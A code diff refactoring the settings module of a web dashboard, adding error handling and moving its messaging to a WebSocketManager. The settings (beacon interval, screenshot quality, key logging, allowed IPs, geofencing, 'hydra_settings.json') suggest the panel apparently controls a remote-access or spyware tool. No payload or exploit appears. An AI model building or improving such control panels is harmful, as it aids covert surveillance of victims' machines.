@@ -5,80 +5,171 @@ const Settings = {
 
     init(socket) {
         this.socket = socket;
+        console.log('Settings initialized with socket');
         this.setupEventListeners();
         this.loadSettings();
     },
 
     setupEventListeners() {
-        // Settings form
-        document.getElementById('settings-form').addEventListener('submit', (e) => {
-            e.preventDefault();
-            this.saveSettings();
-        });
+        try {
+            // Settings form
+            const settingsForm = document.getElementById('settings-form');
+            if (settingsForm) {
+                settingsForm.addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    this.saveSettings();
+                });
+            }
 
-        // Security form
-        document.getElementById('security-form').addEventListener('submit', (e) => {
-            e.preventDefault();
-            this.saveSecuritySettings();
-        });
+            // Security form
+            const securityForm = document.getElementById('security-form');
+            if (securityForm) {
+                securityForm.addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    this.saveSecuritySettings();
+                });
+            }
 
-        // Socket event listeners
-        this.socket.on('settings_updated', this.handleSettingsUpdated.bind(this));
-        this.socket.on('security_settings_updated', this.handleSecuritySettingsUpdated.bind(this));
+            // Use custom event for WebSocket messages
+            document.addEventListener('socket-message', (event) => {
+                const message = event.detail;
+                if (message.type === 'settings') {
+                    this.handleSettings(message);
+                } else if (message.type === 'settings_updated') {
+                    this.handleSettingsUpdated(message);
+                } else if (message.type === 'security_settings_updated') {
+                    this.handleSecuritySettingsUpdated(message);
+                }
+            });
+            
+            console.log('Settings event listeners set up');
+        } catch (error) {
+            console.error('Error setting up Settings event listeners:', error);
+        }
     },
 
     loadSettings() {
-        this.socket.emit('get_settings');
+        if (WebSocketManager && WebSocketManager.send) {
+            WebSocketManager.send({
+                type: 'get_settings'
+            });
+        } else {
+            console.error('WebSocketManager not available in Settings module');
+        }
     },
 
     handleSettings(data) {
+        if (!data.settings) {
+            console.error('No settings data received');
+            return;
+        }
+        
         this.currentSettings = data.settings;
         this.updateSettingsForm();
     },
 
     updateSettingsForm() {
-        // General settings
-        document.getElementById('beacon-interval').value = this.currentSettings.beacon_interval || 60;
-        document.getElementById('screenshot-quality').value = this.currentSettings.screenshot_quality || 'medium';
-        document.getElementById('key-logging').checked = this.currentSettings.key_logging || false;
+        try {
+            // General settings
+            const beaconInterval = document.getElementById('beacon-interval');
+            const screenshotQuality = document.getElementById('screenshot-quality');
+            const keyLogging = document.getElementById('key-logging');
+            
+            if (beaconInterval) {
+                beaconInterval.value = this.currentSettings.beacon_interval || 60;
+            }
+            
+            if (screenshotQuality) {
+                screenshotQuality.value = this.currentSettings.screenshot_quality || 'medium';
+            }
+            
+            if (keyLogging) {
+                keyLogging.checked = this.currentSettings.key_logging || false;
+            }
+        } catch (error) {
+            console.error('Error updating settings form:', error);
+        }
     },
 
     saveSettings() {
-        const settings = {
-            beacon_interval: parseInt(document.getElementById('beacon-interval').value),
-            screenshot_quality: document.getElementById('screenshot-quality').value,
-            key_logging: document.getElementById('key-logging').checked
-        };
+        try {
+            const beaconInterval = document.getElementById('beacon-interval');
+            const screenshotQuality = document.getElementById('screenshot-quality');
+            const keyLogging = document.getElementById('key-logging');
+            
+            if (!beaconInterval || !screenshotQuality || !keyLogging) {
+                console.error('Settings form elements not found');
+                return;
+            }
+            
+            const settings = {
+                beacon_interval: parseInt(beaconInterval.value),
+                screenshot_quality: screenshotQuality.value,
+                key_logging: keyLogging.checked
+            };
 
-        this.socket.emit('update_settings', settings);
+            if (WebSocketManager && WebSocketManager.send) {
+                WebSocketManager.send({
+                    type: 'update_settings',
+                    settings: settings
+                });
+            }
+        } catch (error) {
+            console.error('Error saving settings:', error);
+            dashboard.showNotification('Error saving settings', 'danger');
+        }
     },
 
     handleSettingsUpdated(data) {
         if (data.success) {
             dashboard.showNotification('Settings updated successfully', 'success');
-            this.currentSettings = data.settings;
+            if (data.settings) {
+                this.currentSettings = data.settings;
+            }
         } else {
-            dashboard.showNotification('Failed to update settings: ' + data.error, 'danger');
+            dashboard.showNotification('Failed to update settings: ' + (data.error || 'Unknown error'), 'danger');
         }
     },
 
     saveSecuritySettings() {
-        const settings = {
-            encryption_key: document.getElementById('encryption-key').value,
-            allowed_ips: document.getElementById('allowed-ips').value.split('\n').filter(ip => ip.trim()),
-            geofencing: document.getElementById('geofencing').checked
-        };
+        try {
+            const encryptionKey = document.getElementById('encryption-key');
+            const allowedIPs = document.getElementById('allowed-ips');
+            const geofencing = document.getElementById('geofencing');
+            
+            if (!encryptionKey || !allowedIPs || !geofencing) {
+                console.error('Security settings form elements not found');
+                return;
+            }
+            
+            const settings = {
+                encryption_key: encryptionKey.value,
+                allowed_ips: allowedIPs.value.split('\n').filter(ip => ip.trim()),
+                geofencing: geofencing.checked
+            };
 
-        this.socket.emit('update_security_settings', settings);
+            if (WebSocketManager && WebSocketManager.send) {
+                WebSocketManager.send({
+                    type: 'update_security_settings',
+                    settings: settings
+                });
+            }
+        } catch (error) {
+            console.error('Error saving security settings:', error);
+            dashboard.showNotification('Error saving security settings', 'danger');
+        }
     },
 
     handleSecuritySettingsUpdated(data) {
         if (data.success) {
             dashboard.showNotification('Security settings updated successfully', 'success');
             // Clear sensitive fields
-            document.getElementById('encryption-key').value = '';
+            const encryptionKey = document.getElementById('encryption-key');
+            if (encryptionKey) {
+                encryptionKey.value = '';
+            }
         } else {
-            dashboard.showNotification('Failed to update security settings: ' + data.error, 'danger');
+            dashboard.showNotification('Failed to update security settings: ' + (data.error || 'Unknown error'), 'danger');
         }
     },
 
@@ -94,31 +185,47 @@ const Settings = {
 
     // Export settings
     exportSettings() {
-        const settings = {
-            general: this.currentSettings,
-            security: {
-                allowed_ips: document.getElementById('allowed-ips').value.split('\n').filter(ip => ip.trim()),
-                geofencing: document.getElementById('geofencing').checked
-            }
-        };
+        try {
+            const settings = {
+                general: this.currentSettings,
+                security: {
+                    allowed_ips: document.getElementById('allowed-ips').value.split('\n').filter(ip => ip.trim()),
+                    geofencing: document.getElementById('geofencing').checked
+                }
+            };
 
-        const blob = new Blob([JSON.stringify(settings, null, 2)], { type: 'application/json' });
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'hydra_settings.json';
-        a.click();
-        window.URL.revokeObjectURL(url);
+            const blob = new Blob([JSON.stringify(settings, null, 2)], { type: 'application/json' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'hydra_settings.json';
+            a.click();
+            window.URL.revokeObjectURL(url);
+        } catch (error) {
+            console.error('Error exporting settings:', error);
+            dashboard.showNotification('Error exporting settings', 'danger');
+        }
     },
 
     // Import settings
     importSettings(file) {
+        if (!file) {
+            dashboard.showNotification('No file selected', 'warning');
+            return;
+        }
+        
         const reader = new FileReader();
         reader.onload = (e) => {
             try {
                 const settings = JSON.parse(e.target.result);
-                this.socket.emit('import_settings', settings);
+                if (WebSocketManager && WebSocketManager.send) {
+                    WebSocketManager.send({
+                        type: 'import_settings',
+                        settings: settings
+                    });
+                }
             } catch (error) {
+                console.error('Error parsing settings file:', error);
                 dashboard.showNotification('Invalid settings file format', 'danger');
             }
         };
@@ -126,19 +233,8 @@ const Settings = {
     }
 };
 
-// Initialize when document is ready
+// Remove the duplicate initialization since WebSocketManager now handles this
 document.addEventListener('DOMContentLoaded', () => {
-    // Initialize WebSocket connection
-    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const socket = new WebSocket(`${protocol}//${window.location.host}/ws/dashboard`);
-
-    // Handle WebSocket messages
-    socket.onmessage = (event) => {
-        const data = JSON.parse(event.data);
-        if (data.type === 'settings_update') {
-            updateSettings(data.settings);
-        }
-    };
-
-    Settings.init(socket);
+    // WebSocketManager will initialize this module
+    console.log('Settings waiting for WebSocketManager initialization');
 }); 
